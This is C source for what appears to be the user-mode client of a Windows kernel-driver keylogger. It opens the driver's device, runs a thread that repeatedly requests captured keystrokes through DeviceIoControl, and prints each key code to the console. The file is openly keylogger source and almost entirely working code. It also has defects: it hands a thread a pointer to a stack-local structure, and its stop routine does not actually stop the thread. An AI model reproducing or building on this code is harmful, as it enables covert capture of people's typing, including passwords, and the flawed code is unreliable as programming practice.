#include <Windows.h>
#include <Tchar.h>

#include "../KeyLogger/info.h"
#include "../KeyLogger/ioCtls.h"

#define DEVICE_PATH \
	_T("\\\\.\\") DEVICE_NAME

typedef VOID(*PUSH_CALLBACK)(USHORT);

typedef struct _CONTEXT_DATA
{
	PUSH_CALLBACK pushCallback;
	HANDLE hDevice;

} CONTEXT_DATA, *PCONTEXT_DATA;

DWORD
ThreadProc(
	LPVOID lpParameter)
{
	USHORT key;
	DWORD ret;
	PCONTEXT_DATA pContextData = lpParameter;

	while (TRUE)
	{
		DeviceIoControl(pContextData->hDevice, GET_KEY, NULL, 0, &key, sizeof key, &ret, NULL);
		pContextData->pushCallback(key);
	}

	return EXIT_SUCCESS;
}

HANDLE
StartLogging(
	HANDLE hDevice,
	PUSH_CALLBACK pushRoutine)
{
	CONTEXT_DATA contextData = { pushRoutine, hDevice };
	return CreateThread(NULL, 0, ThreadProc, &contextData, 0, NULL);
}

BOOL
StopLogging(
	HANDLE hThread)
{
	return !CloseHandle(hThread);
}

VOID
PushRoutine(
	USHORT key)
{
	_ftprintf(stdout, _T("key: %hu\n"), key);
}

HANDLE
OpenDriver(
	VOID)
{
	return CreateFile(
		DEVICE_PATH,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
}

BOOL
CloseDriver(
	HANDLE hDriver)
{
	return !CloseHandle(hDriver);
}


INT _tmain(VOID)
{
	HANDLE hDevice = OpenDriver();
	HANDLE hLogger = StartLogging(hDevice, PushRoutine);
	
	WaitForSingleObject(hLogger, INFINITE);

	StopLogging(hLogger);
	CloseDriver(hDevice);

	return EXIT_SUCCESS;
}
